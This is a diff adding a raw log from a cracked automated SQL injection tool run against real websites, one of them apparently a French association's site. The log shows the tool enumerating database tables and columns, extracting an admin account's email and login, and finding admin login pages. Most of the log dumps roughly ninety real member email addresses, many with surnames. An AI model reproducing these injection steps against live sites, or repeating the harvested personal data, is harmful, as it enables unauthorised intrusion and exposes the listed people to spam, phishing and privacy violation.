@@ -1,0 +1,789 @@
+Cracked by Service Manual { AoRE Team }  
+Test parameter: id
+Http Error: 302 Found
+Host IP: 87.230.63.60
+Web Server: Apache
+Finding Keyword...
+Http Error: 302 Found
+Retrying to find keyword...
+Http Error: 302 Found
+Can not find keyword but let me do a try!
+Finding Injection type...
+Canceling...
+Test parameter: file
+Job Canceled!
+Analyzing http://www.xxxxxxxxxxx.com  [HIDING]
+Test parameter: id
+Host IP: 95.110.201.21
+Web Server: Microsoft-IIS/8.5
+Powered-by: PHP/5.5.19
+Powered-by: ASP.NET
+Can not find keyword but let me do a try!
+I guess injection type is Integer?! If injection failed, retry with a manual keyword.
+Can't find db server type! But maybe there be some chances! [-o<
+Finding columns count(MySQL,MsSQL 2005): 2
+Canceling...
+Turning on mod_security bypass
+Cannot find column count!
+MySQL error based injection method cant be used!
+Testing for MsSQL error based injection method
+Bypassing illegal union failed! Turning off this feature
+Changing inejction syntax
+Retrying to find current data base
+I think i was wrong about injection type trying String type!
+MsSQL error based injection method cant be used!
+Job Canceled!
+Analyzing http://www.lestroisa.com/articles.php?id=3 with 1 input parameter(s)
+Test parameter: id
+Host IP: 188.165.193.100
+Web Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
+Powered-by: PHP/5.2.6-1+lenny16
+Can not find keyword but let me do a try!
+I guess injection type is Integer?! If injection failed, retry with a manual keyword.
+DB Server: MySQL
+Selected Column Count is 7
+Valid String Column is 2
+Current DB: aaa_troisa
+Data Base Found: information_schema
+Data Base Found: aaa_troisa
+Data Base Found: twk_troisa
+Count(table_name) of information_schema.tables where table_schema=0x6161615F74726F697361 is 10
+Tables found: CR,agenda,albums,annuaire,articles,categories,comptes_acces,comptes_admin,news,photos
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x4352 is 5
+Columns found: CR_id,titre,texte,lien,texte_lien
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x6167656E6461 is 2
+Columns found: agenda_id,texte
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x616C62756D73 is 3
+Columns found: album_id,titre_album,description_album
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x616E6E7561697265 is 22
+Columns found: annu_id,civilite_annu,nom_annu,prenom_annu,fonction_annu,adresseperso_annu,cpperso_annu,villeperso_annu,telpersof_annu,telpersop_annu,employeur_annu,adressepro_annu,cppro_annu,villepro_annu,telpro_annu,faxpro_annu,email_annu,photo_annu,dateadh_annu,parrains_annu,poste_annu,comment_annu
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x61727469636C6573 is 8
+Columns found: art_id,id_cat,titre_art,date_publi,texte_art,lien_art,texte_lien_art,auteur_art
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x63617465676F72696573 is 3
+Columns found: cat_id,titre_cat,description_cat
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x636F6D707465735F6163636573 is 3
+Columns found: cpte,id,sesam
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x636F6D707465735F61646D696E is 2
+Columns found: cpte_ad,sesam
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x6E657773 is 6
+Columns found: news_id,titre,date_publi,texte,lien,texte_lien
+Count(column_name) of information_schema.columns where table_schema=0x6161615F74726F697361 and table_name=0x70686F746F73 is 6
+Columns found: photo_id,id_album,titre_photo,date_photo,description_photo,url_photo
+Count(table_name) of information_schema.tables where table_schema=0x696E666F726D6174696F6E5F736368656D61 is 17
+Tables found: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,KEY_COLUMN_USAGE,PROFILING,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS
+Count(table_name) of information_schema.tables where table_schema=0x74776B5F74726F697361 is 224
+Can not get all tables by group_concat!
+Count(table_name) of information_schema.tables where table_schema=0x74776B5F74726F697361 is 224
+Table found: galaxia_activities
+Table found: galaxia_processes
+Table found: galaxia_roles
+Table found: galaxia_instances
+Table found: messu_archive
+Table found: galaxia_instance_comments
+Table found: galaxia_instance_activities
+Table found: galaxia_user_roles
+Table found: galaxia_activity_roles
+Table found: galaxia_transitions
+Table found: galaxia_workitems
+Table found: messu_messages
+Table found: messu_sent
+Table found: tiki_actionlog
+Table found: tiki_actionlog_conf
+Table found: tiki_actionlog_params
+Table found: tiki_article_types
+Table found: tiki_articles
+Table found: tiki_banners
+Table found: tiki_banning
+Table found: tiki_banning_sections
+Table found: tiki_blog_posts_images
+Table found: tiki_blog_activity
+Table found: tiki_blog_posts
+Table found: tiki_blogs
+Table found: tiki_calendar_categories
+Table found: sessions
+Table found: tiki_calendar_locations
+Table found: tiki_calendar_options
+Table found: tiki_calendar_items
+Table found: tiki_calendar_roles
+Table found: tiki_categories
+Table found: tiki_calendars
+Table found: tiki_categorized_objects
+Table found: tiki_category_objects
+Table found: tiki_category_sites
+Table found: tiki_chart_items
+Table found: tiki_charts
+Table found: tiki_calendar_recurrence
+Table found: tiki_chat_channels
+Table found: tiki_charts_votes
+Table found: tiki_chat_users
+Table found: tiki_chat_messages
+Table found: tiki_comments
+Table found: tiki_content
+Table found: tiki_charts_rankings
+Table found: tiki_content_templates
+Table found: tiki_content_templates_sections
+Table found: tiki_contributions
+Table found: tiki_contributions_assigned
+Table found: tiki_copyrights
+Table found: tiki_cookies
+Table found: tiki_directory_categories
+Table found: tiki_directory_search
+Table found: tiki_download
+Table found: tiki_directory_sites
+Table found: tiki_dsn
+Table found: tiki_events
+Table found: tiki_dynamic_variables
+Table found: tiki_faq_questions
+Table found: tiki_extwiki
+Table found: tiki_feature
+Table found: tiki_file_galleries
+Table found: tiki_file_handlers
+Table found: tiki_drawings
+Table found: tiki_forum_attachments
+Table found: tiki_files
+Table found: tiki_forum_reads
+Table found: tiki_forums
+Table found: tiki_forums_queue
+Table found: tiki_forums_reported
+Table found: tiki_freetags
+Table found: tiki_faqs
+Table found: tiki_freetagged_objects
+Table found: tiki_featured_links
+Table found: tiki_friends
+Table found: tiki_friendship_requests
+Table found: tiki_games
+Table found: tiki_galleries_scales
+Table found: tiki_group_inclusion
+Table found: tiki_group_watches
+Table found: tiki_groupalert
+Table found: tiki_history
+Table found: tiki_hotwords
+Table found: tiki_html_pages
+Table found: tiki_html_pages_dynamic_zones
+Table found: tiki_images
+Table found: tiki_images_data
+Table found: tiki_integrator_rules
+Table found: tiki_galleries
+Table found: tiki_languages
+Table found: tiki_link_cache
+Table found: tiki_links
+Table found: tiki_live_support_events
+Table found: tiki_live_support_message_comments
+Table found: tiki_live_support_messages
+Table found: tiki_live_support_modules
+Table found: tiki_live_support_requests
+Table found: tiki_live_support_operators
+Table found: tiki_logs
+Table found: tiki_mail_events
+Table found: tiki_integrator_reps
+Table found: tiki_mailin_accounts
+Table found: tiki_language
+Table found: tiki_minical_topics
+Table found: tiki_menu_languages
+Table found: tiki_menus
+Table found: tiki_minichat
+Table found: tiki_newsletter_subscriptions
+Table found: tiki_newsletter_groups
+Table found: tiki_newsletter_included
+Table found: tiki_modules
+Table found: tiki_minical_events
+Table found: tiki_menu_options
+Table found: tiki_newsletters
+Table found: tiki_newsreader_marks
+Table found: tiki_page_drafts
+Table found: tiki_newsreader_servers
+Table found: tiki_pages
+Table found: tiki_object_ratings
+Table found: tiki_objects
+Table found: tiki_page_footnotes
+Table found: tiki_pages_changes
+Table found: tiki_profile_symbols
+Table found: tiki_pages_translation_bits
+Table found: tiki_programmed_content
+Table found: tiki_poll_options
+Table found: tiki_plugin_security
+Table found: tiki_private_messages
+Table found: tiki_pageviews
+Table found: tiki_poll_objects
+Table found: tiki_polls
+Table found: tiki_preferences
+Table found: tiki_quicktags
+Table found: tiki_quiz_questions
+Table found: tiki_quiz_results
+Table found: tiki_quiz_stats_sum
+Table found: tiki_quiz_stats
+Table found: tiki_quiz_question_options
+Table found: tiki_received_articles
+Table found: tiki_received_pages
+Table found: tiki_quizzes
+Table found: tiki_related_categories
+Table found: tiki_rss_modules
+Table found: tiki_schema
+Table found: tiki_referer_stats
+Table found: tiki_score
+Table found: tiki_search_stats
+Table found: tiki_rss_feeds
+Table found: tiki_registration_fields
+Table found: tiki_searchindex
+Table found: tiki_searchsyllable
+Table found: tiki_searchwords
+Table found: tiki_semaphores
+Table found: tiki_sent_newsletters
+Table found: tiki_semantic_tokens
+Table found: tiki_sent_newsletters_errors
+Table found: tiki_secdb
+Table found: tiki_sefurl_regex_out
+Table found: tiki_sent_newsletters_files
+Table found: tiki_sheet_values
+Table found: tiki_sheets
+Table found: tiki_sessions
+Table found: tiki_shoutbox
+Table found: tiki_stats
+Table found: tiki_structures
+Table found: tiki_sheet_layout
+Table found: tiki_survey_question_options
+Table found: tiki_tags
+Table found: tiki_survey_questions
+Table found: tiki_surveys
+Table found: tiki_shoutbox_words
+Table found: tiki_theme_control_categs
+Table found: tiki_structure_versions
+Table found: tiki_submissions
+Table found: tiki_suggested_faq_questions
+Table found: tiki_tracker_item_fields
+Table found: tiki_theme_control_objects
+Table found: tiki_theme_control_sections
+Table found: tiki_topics
+Table found: tiki_tracker_item_comments
+Table found: tiki_tracker_options
+Table found: tiki_tracker_item_attachments
+Table found: tiki_tracker_items
+Table found: tiki_tracker_fields
+Table found: tiki_trackers
+Table found: tiki_translated_objects
+Table found: tiki_user_answers_uploads
+Table found: tiki_untranslated
+Table found: tiki_user_bookmarks_urls
+Table found: tiki_user_mail_accounts
+Table found: tiki_user_menus
+Table found: tiki_user_bookmarks_folders
+Table found: tiki_user_answers
+Table found: tiki_user_modules
+Table found: tiki_user_quizzes
+Table found: tiki_user_taken_quizzes
+Table found: tiki_user_tasks
+Table found: tiki_user_preferences
+Table found: tiki_user_votings
+Table found: tiki_user_tasks_history
+Table found: tiki_user_assigned_modules
+Table found: tiki_user_watches
+Table found: tiki_user_notes
+Table found: tiki_user_postings
+Table found: tiki_userpoints
+Table found: tiki_webmail_contacts_fields
+Table found: tiki_users
+Table found: tiki_webmail_contacts_groups
+Table found: tiki_webmail_contacts_ext
+Table found: tiki_webservice
+Table found: tiki_webmail_contacts
+Table found: tiki_webmail_messages
+Table found: tiki_users_score
+Table found: users_objectpermissions
+Table found: tiki_webservice_template
+Table found: users_groups
+Table found: tiki_zones
+Table found: users_usergroups
+Table found: users_users
+Table found: users_permissions
+Table found: tiki_wiki_attachments
+Table found: tiki_userfiles
+Table found: users_grouppermissions
+Count(column_name) of information_schema.columns where table_schema=0x74776B5F74726F697361 and table_name=0x74696B695F636861745F7573657273 is 3
+Column found: nickname
+Column found: timestamp
+Column found: channelId
+Count(column_name) of information_schema.columns where table_schema=0x74776B5F74726F697361 and table_name=0x74696B695F636861745F6D65737361676573 is 5
+Column found: messageId
+Column found: data
+Column found: poster
+Column found: channelId
+Column found: timestamp
+Count(*) of twk_troisa.tiki_chat_messages is 0
+Can not get rows count, trying to get 10 rows
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Count(*) of twk_troisa.tiki_chat_messages is 0
+Can not get rows count, trying to get 10 rows
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Data Found: data=
+Count(*) of twk_troisa.tiki_chat_messages is 0
+Can not get rows count, trying to get 10 rows
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Count(*) of twk_troisa.tiki_chat_messages is 0
+Can not get rows count, trying to get 10 rows
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Data Found: data,poster,channelId=
+Count(column_name) of information_schema.columns where table_schema=0x74776B5F74726F697361 and table_name=0x75736572735F7573657273 is 25
+Column found: userId
+Column found: email
+Column found: provpass
+Column found: default_group
+Column found: pass_confirm
+Column found: currentLogin
+Column found: lastLogin
+Column found: challenge
+Column found: password
+Column found: login
+Column found: registrationDate
+Column found: hash
+Column found: created
+Column found: avatarName
+Column found: avatarSize
+Column found: avatarFileType
+Column found: avatarData
+Column found: avatarLibName
+Column found: score
+Column found: email_confirm
+Column found: avatarType
+Column found: unsuccessful_logins
+Column found: waiting
+Canceling...
+Column found: email_confirm
+Column found: avatarType
+Job Canceled!
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,password=webmestre@lestroisa.com^
+Canceling...
+Job Canceled!
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,password=webmestre@lestroisa.com^
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,password=webmestre@lestroisa.com^
+Count(*) of twk_troisa.users_users is 1
+Data Found: login=admin
+Count(*) of twk_troisa.users_users is 1
+Data Found: password,login=^admin
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,password=webmestre@lestroisa.com^
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,userId,pass_confirm=webmestre@lestroisa.com^1^1267806332
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,password,login,userId,pass_confirm=webmestre@lestroisa.com^^admin^1^1267806332
+Finding admin page: http://www.lestroisa.com/
+Page Found: http://www.lestroisa.com/cgi-bin/loginphp
+Page Found: http://www.lestroisa.com/cgi-bin/loginasp
+Job Finished
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,password,login,userId,pass_confirm,provpass,registrationDate,currentLogin=
+Count(*) of twk_troisa.users_users is 1
+Data Found: email,password,login,userId,pass_confirm,registrationDate=
+Count(column_name) of information_schema.columns where table_schema=0x74776B5F74726F697361 and table_name=0x74696B695F6D696E6963686174 is 6
+Column found: id
+Column found: user
+Column found: nick
+Column found: ts
+Column found: msg
+Column found: channel
+Count(*) of twk_troisa.tiki_minichat is 0
+Can not get rows count, trying to get 10 rows
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Data Found: id,user=
+Count(*) of aaa_troisa.comptes_acces is 1
+Data Found: id=
+Count(*) of aaa_troisa.annuaire is 93
+Data Found: email_annu=eric.bolou@fr.qbe.com
+Data Found: email_annu=billy.adi@wanadoo.fr
+Data Found: email_annu=l.cellot@gfc-assurance.com
+Data Found: email_annu=frederic.durot@grassavoye.com
+Data Found: email_annu=pierre.bandu@wanadoo.fr
+Data Found: email_annu=mvanweddingen@yahoo.fr
+Data Found: email_annu=csalle@abcast-assurances.com
+Data Found: email_annu=francois_serres@aviva.fr
+Data Found: email_annu=bruno.stehly@gmail.com
+Data Found: email_annu=fboustouler@tpi-si.com
+Data Found: email_annu=cecile.boussardon@hiscox.fr
+Data Found: email_annu=chenaud@groupe-satec.com
+Data Found: email_annu=schchauveau@orange.fr
+Data Found: email_annu=
+Data Found: email_annu=gilles.veillie@carene.fr
+Data Found: email_annu=sylvain_branchu@aviva.fr
+Data Found: email_annu=
+Data Found: email_annu=jjbordoni@gmail.com
+Data Found: email_annu=alain.chansel@sfr.fr
+Data Found: email_annu=dquentin@gfa.generali.fr
+Data Found: email_annu=parispatrimoine@orange.fr
+Data Found: email_annu=pepuyo@normand-assurances.com
+Data Found: email_annu=michel.rulleau@wanadoo.fr
+Data Found: email_annu=mroussel075@gmail.com
+Data Found: email_annu=fschmit@groupeac.fr
+Data Found: email_annu=viviane.rouzic@aon.fr
+Data Found: email_annu=pierre.jolly@acegroup.com
+Data Found: email_annu=yves.mellac01@free.fr
+Data Found: email_annu=monteils.marc@wanadoo.fr
+Data Found: email_annu=bleroux@diot.fr
+Data Found: email_annu=rgrozdoff@suisscourtage.com
+Data Found: email_annu=michel.magnin5@wanadoo.fr
+Data Found: email_annu=luc.leman@club-internet.fr
+Data Found: email_annu=jean.louis.malnuit@grassavoye.com
+Data Found: email_annu=vlasmezas@generali.fr 
+Data Found: email_annu=sebastien.pelfort@grassavoye.com
+Data Found: email_annu=helene.botton@albingia.fr
+Data Found: email_annu=granseig@hotmail.com 
+Data Found: email_annu=leila.belharizi@allianz.fr
+Data Found: email_annu=jeanpierre.samyn@acapassurance.fr
+Data Found: email_annu=ccardosi@accsgouy.com
+Data Found: email_annu=s-guitton@galtier-environnement.fr
+Data Found: email_annu=bhenault@tpi-si.com
+Data Found: email_annu=gioan@groupe-satec.com
+Data Found: email_annu=jfily@scor.com
+Data Found: email_annu=franck.liote@scalassur.fr
+Data Found: email_annu=yves.claesen@yahoo.com
+Data Found: email_annu=thierrydubois75@sfr.fr 
+Data Found: email_annu=sylvie.delachaume@fr.qbe.com
+Data Found: email_annu=gmassart@diot.fr
+Data Found: email_annu=francois.de-bozzi@wanadoo.fr
+Data Found: email_annu=rudolphdavid@voila.fr
+Data Found: email_annu=anita.craquelin@albingia.fr
+Data Found: email_annu=eric@famille-blum.org
+Data Found: email_annu=alain.jouvet@allianz.fr
+Data Found: email_annu=sophie.fleurence@albingia.fr
+Data Found: email_annu=Jean-Pierre.Juillard@marsh.com
+Data Found: email_annu=dcharvin@groupeac.fr
+Data Found: email_annu=maryse.godin@verlingue.fr
+Data Found: email_annu=yann.lyon@acegroup.com
+Data Found: email_annu=labourdette@groupe-satec.com
+Data Found: email_annu=isabelle.moulin@albingia.fr
+Data Found: email_annu=catherine.renodon-delubria@hdi-gerling.fr
+Data Found: email_annu=philippe_jolly@aon.fr
+Data Found: email_annu=fgerbeaux@finaxy.com
+Data Found: email_annu=jbednarz@gfa.generali.fr
+Data Found: email_annu=julien.fabretti@finassur.eu
+Data Found: email_annu=sebastien.feuvrier@axa-cs.com
+Data Found: email_annu=olivier.wils@marsh.com 
+Data Found: email_annu=marie.gauliard@albingia.fr
+Data Found: email_annu=patrick.cardosi@accsgouy.com
+Data Found: email_annu=jeanluc.mabboux@free.fr
+Data Found: email_annu=anne.guerin@acegroup.com
+Data Found: email_annu=christophe.marliere@grassavoye.com
+Data Found: email_annu=pinon@groupe-satec.com
+Data Found: email_annu=daniel.henocq@scalassur.fr
+Data Found: email_annu=jean-baptiste.regnier@allianz.com
+Data Found: email_annu=stephanie.malingue@s2hgroup.com
+Data Found: email_annu=Patrick.Grard@chartisinsurance.com
+Data Found: email_annu=berengere.de.malartic@grassavoye.com
+Data Found: email_annu=t.derubay@declarens.com
+Data Found: email_annu=tsans@protec-feu-rs.fr
+Data Found: email_annu=pascale.martineau@aig.com
+Data Found: email_annu=jdacunha@afs-securite.fr
+Data Found: email_annu=mustapha.ahmine@albingia.fr
+Data Found: email_annu=fabrice.leclerc_2@allianz.fr
+Data Found: email_annu=jean-pierre.rouquet@april.com
+Data Found: email_annu=didiercazenave@aol.com
+Data Found: email_annu=jrenauld@ortassurances.fr
+Data Found: email_annu=6565
+Data Found: email_annu=vnioloux@amlinfrance.com
+Data Found: email_annu=bertrand.degremont@aig.com
+Data Found: email_annu=patrice.angelo@allianz.fr
+Count(*) of aaa_troisa.annuaire is 93
+Data Found: email_annu=eric.bolou@fr.qbe.com
+Data Found: email_annu=bruno.stehly@gmail.com
+Data Found: email_annu=frederic.durot@grassavoye.com
+Data Found: email_annu=francois_serres@aviva.fr
+Data Found: email_annu=
+Data Found: email_annu=csalle@abcast-assurances.com
+Data Found: email_annu=mvanweddingen@yahoo.fr
+Data Found: email_annu=pierre.bandu@wanadoo.fr
+Data Found: email_annu=l.cellot@gfc-assurance.com
+Data Found: email_annu=jjbordoni@gmail.com
+Data Found: email_annu=chenaud@groupe-satec.com
+Data Found: email_annu=billy.adi@wanadoo.fr
+Data Found: email_annu=alain.chansel@sfr.fr
+Data Found: email_annu=fboustouler@tpi-si.com
+Data Found: email_annu=cecile.boussardon@hiscox.fr
+Data Found: email_annu=gilles.veillie@carene.fr
+Data Found: email_annu=schchauveau@orange.fr
+Data Found: email_annu=viviane.rouzic@aon.fr
+Data Found: email_annu=michel.rulleau@wanadoo.fr
+Data Found: email_annu=fschmit@groupeac.fr
+Data Found: email_annu=pierre.jolly@acegroup.com
+Data Found: email_annu=pepuyo@normand-assurances.com
+Data Found: email_annu=mroussel075@gmail.com
+Data Found: email_annu=dquentin@gfa.generali.fr
+Data Found: email_annu=parispatrimoine@orange.fr
+Data Found: email_annu=luc.leman@club-internet.fr
+Data Found: email_annu=rgrozdoff@suisscourtage.com
+Data Found: email_annu=helene.botton@albingia.fr
+Data Found: email_annu=yves.mellac01@free.fr
+Data Found: email_annu=michel.magnin5@wanadoo.fr
+Data Found: email_annu=monteils.marc@wanadoo.fr
+Data Found: email_annu=bleroux@diot.fr
+Data Found: email_annu=jean.louis.malnuit@grassavoye.com
+Data Found: email_annu=
+Data Found: email_annu=leila.belharizi@allianz.fr
+Data Found: email_annu=alain.jouvet@allianz.fr
+Data Found: email_annu=vlasmezas@generali.fr 
+Data Found: email_annu=sebastien.pelfort@grassavoye.com
+Data Found: email_annu=jeanpierre.samyn@acapassurance.fr
+Data Found: email_annu=ccardosi@accsgouy.com
+Data Found: email_annu=granseig@hotmail.com 
+Data Found: email_annu=sylvain_branchu@aviva.fr
+Data Found: email_annu=s-guitton@galtier-environnement.fr
+Data Found: email_annu=gioan@groupe-satec.com
+Data Found: email_annu=bhenault@tpi-si.com
+Data Found: email_annu=franck.liote@scalassur.fr
+Data Found: email_annu=thierrydubois75@sfr.fr 
+Data Found: email_annu=sylvie.delachaume@fr.qbe.com
+Data Found: email_annu=gmassart@diot.fr
+Data Found: email_annu=yves.claesen@yahoo.com
+Data Found: email_annu=francois.de-bozzi@wanadoo.fr
+Data Found: email_annu=rudolphdavid@voila.fr
+Data Found: email_annu=fgerbeaux@finaxy.com
+Data Found: email_annu=anita.craquelin@albingia.fr
+Data Found: email_annu=eric@famille-blum.org
+Data Found: email_annu=sophie.fleurence@albingia.fr
+Data Found: email_annu=Jean-Pierre.Juillard@marsh.com
+Data Found: email_annu=olivier.wils@marsh.com 
+Data Found: email_annu=philippe_jolly@aon.fr
+Data Found: email_annu=maryse.godin@verlingue.fr
+Data Found: email_annu=dcharvin@groupeac.fr
+Data Found: email_annu=jfily@scor.com
+Data Found: email_annu=yann.lyon@acegroup.com
+Data Found: email_annu=labourdette@groupe-satec.com
+Data Found: email_annu=isabelle.moulin@albingia.fr
+Data Found: email_annu=catherine.renodon-delubria@hdi-gerling.fr
+Data Found: email_annu=julien.fabretti@finassur.eu
+Data Found: email_annu=sebastien.feuvrier@axa-cs.com
+Data Found: email_annu=jbednarz@gfa.generali.fr
+Data Found: email_annu=marie.gauliard@albingia.fr
+Data Found: email_annu=patrick.cardosi@accsgouy.com
+Data Found: email_annu=jeanluc.mabboux@free.fr
+Data Found: email_annu=anne.guerin@acegroup.com
+Data Found: email_annu=christophe.marliere@grassavoye.com
+Data Found: email_annu=fabrice.leclerc_2@allianz.fr
+Data Found: email_annu=pinon@groupe-satec.com
+Data Found: email_annu=jrenauld@ortassurances.fr
+Data Found: email_annu=Patrick.Grard@chartisinsurance.com
+Data Found: email_annu=jean-pierre.rouquet@april.com
+Data Found: email_annu=daniel.henocq@scalassur.fr
+Data Found: email_annu=berengere.de.malartic@grassavoye.com
+Data Found: email_annu=t.derubay@declarens.com
+Data Found: email_annu=patrice.angelo@allianz.fr
+Data Found: email_annu=tsans@protec-feu-rs.fr
+Data Found: email_annu=jean-baptiste.regnier@allianz.com
+Data Found: email_annu=stephanie.malingue@s2hgroup.com
+Data Found: email_annu=pascale.martineau@aig.com
+Data Found: email_annu=jdacunha@afs-securite.fr
+Data Found: email_annu=mustapha.ahmine@albingia.fr
+Data Found: email_annu=6565
+Data Found: email_annu=vnioloux@amlinfrance.com
+Data Found: email_annu=bertrand.degremont@aig.com
+Data Found: email_annu=didiercazenave@aol.com
+Count(*) of aaa_troisa.annuaire is 93
+Data Found: email_annu,nom_annu=eric.bolou@fr.qbe.com^BOLOU
+Data Found: email_annu,nom_annu=billy.adi@wanadoo.fr^BILLY
+Data Found: email_annu,nom_annu=francois_serres@aviva.fr^SERRES
+Data Found: email_annu,nom_annu=bruno.stehly@gmail.com^STEHLY
+Data Found: email_annu,nom_annu=frederic.durot@grassavoye.com^DUROT
+Data Found: email_annu,nom_annu=^THOMINET
+Data Found: email_annu,nom_annu=mvanweddingen@yahoo.fr^VAN WEDDINGEN
+Data Found: email_annu,nom_annu=csalle@abcast-assurances.com^SALLE DE CHOU
+Data Found: email_annu,nom_annu=pierre.bandu@wanadoo.fr^BANDU
+Data Found: email_annu,nom_annu=jjbordoni@gmail.com^BORDONI
+Data Found: email_annu,nom_annu=chenaud@groupe-satec.com^CHENAUD
+Data Found: email_annu,nom_annu=gilles.veillie@carene.fr^VEILLIE
+Data Found: email_annu,nom_annu=alain.chansel@sfr.fr^CHANSEL
+Data Found: email_annu,nom_annu=sylvain_branchu@aviva.fr^BRANCHU
+Data Found: email_annu,nom_annu=fboustouler@tpi-si.com^BOUSTOULER
+Data Found: email_annu,nom_annu=schchauveau@orange.fr^CHAUVEAU
+Data Found: email_annu,nom_annu=l.cellot@gfc-assurance.com^CELLOT
+Data Found: email_annu,nom_annu=^CANO
+Data Found: email_annu,nom_annu=michel.rulleau@wanadoo.fr^RULLEAU
+Data Found: email_annu,nom_annu=fschmit@groupeac.fr^SCHMIT
+Data Found: email_annu,nom_annu=viviane.rouzic@aon.fr^ROUZIC
+Data Found: email_annu,nom_annu=mroussel075@gmail.com^ROUSSEL
+Data Found: email_annu,nom_annu=dquentin@gfa.generali.fr^QUENTIN
+Data Found: email_annu,nom_annu=pepuyo@normand-assurances.com^PUYO
+Data Found: email_annu,nom_annu=cecile.boussardon@hiscox.fr^BOUSSARDON
+Data Found: email_annu,nom_annu=parispatrimoine@orange.fr^PETOIN
+Data Found: email_annu,nom_annu=yves.mellac01@free.fr^MELLAC
+Data Found: email_annu,nom_annu=rgrozdoff@suisscourtage.com^GROZDOFF
+Data Found: email_annu,nom_annu=bleroux@diot.fr^LEROUX
+Data Found: email_annu,nom_annu=monteils.marc@wanadoo.fr^MONTEILS
+Data Found: email_annu,nom_annu=michel.magnin5@wanadoo.fr^MAGNIN
+Data Found: email_annu,nom_annu=luc.leman@club-internet.fr^LEMAN
+Data Found: email_annu,nom_annu=pierre.jolly@acegroup.com^JOLLY
+Data Found: email_annu,nom_annu=helene.botton@albingia.fr^BOTTON
+Data Found: email_annu,nom_annu=sebastien.pelfort@grassavoye.com^PELFORT
+Data Found: email_annu,nom_annu=vlasmezas@generali.fr ^LASMEZAS
+Data Found: email_annu,nom_annu=granseig@hotmail.com ^SEIGNARD
+Data Found: email_annu,nom_annu=alain.jouvet@allianz.fr^JOUVET
+Data Found: email_annu,nom_annu=ccardosi@accsgouy.com^CARDOSI MACHADO
+Data Found: email_annu,nom_annu=leila.belharizi@allianz.fr^BELHARIZI
+Data Found: email_annu,nom_annu=jeanpierre.samyn@acapassurance.fr^SAMYN
+Data Found: email_annu,nom_annu=bhenault@tpi-si.com^HENAULT
+Data Found: email_annu,nom_annu=s-guitton@galtier-environnement.fr^GUITTON
+Data Found: email_annu,nom_annu=jfily@scor.com^FILY
+Data Found: email_annu,nom_annu=gioan@groupe-satec.com^GIOAN
+Data Found: email_annu,nom_annu=francois.de-bozzi@wanadoo.fr^de BOZZI
+Data Found: email_annu,nom_annu=yves.claesen@yahoo.com^CLAESEN
+Data Found: email_annu,nom_annu=thierrydubois75@sfr.fr ^DUBOIS
+Data Found: email_annu,nom_annu=sylvie.delachaume@fr.qbe.com^DELACHAUME
+Data Found: email_annu,nom_annu=rudolphdavid@voila.fr^DAVID
+Data Found: email_annu,nom_annu=anita.craquelin@albingia.fr^CRAQUELIN-GAUDRY
+Data Found: email_annu,nom_annu=eric@famille-blum.org^BLUM
+Data Found: email_annu,nom_annu=gmassart@diot.fr^MASSART
+Data Found: email_annu,nom_annu=sophie.fleurence@albingia.fr^FLEURENCE
+Data Found: email_annu,nom_annu=maryse.godin@verlingue.fr^GODIN
+Data Found: email_annu,nom_annu=Jean-Pierre.Juillard@marsh.com^JUILLARD
+Data Found: email_annu,nom_annu=fgerbeaux@finaxy.com^GERBEAUX
+Data Found: email_annu,nom_annu=philippe_jolly@aon.fr^JOLLY
+Data Found: email_annu,nom_annu=dcharvin@groupeac.fr^CHARVIN
+Data Found: email_annu,nom_annu=jean.louis.malnuit@grassavoye.com^MALNUIT
+Data Found: email_annu,nom_annu=yann.lyon@acegroup.com^LYON
+Data Found: email_annu,nom_annu=labourdette@groupe-satec.com^LABOURDETTE
+Data Found: email_annu,nom_annu=sebastien.feuvrier@axa-cs.com^FEUVRIER
+Data Found: email_annu,nom_annu=catherine.renodon-delubria@hdi-gerling.fr^RENODON DELUBRIA
+Data Found: email_annu,nom_annu=franck.liote@scalassur.fr^LIOTE
+Data Found: email_annu,nom_annu=julien.fabretti@finassur.eu^FABRETTI
+Data Found: email_annu,nom_annu=isabelle.moulin@albingia.fr^MOULIN
+Data Found: email_annu,nom_annu=jbednarz@gfa.generali.fr^BEDNARZ
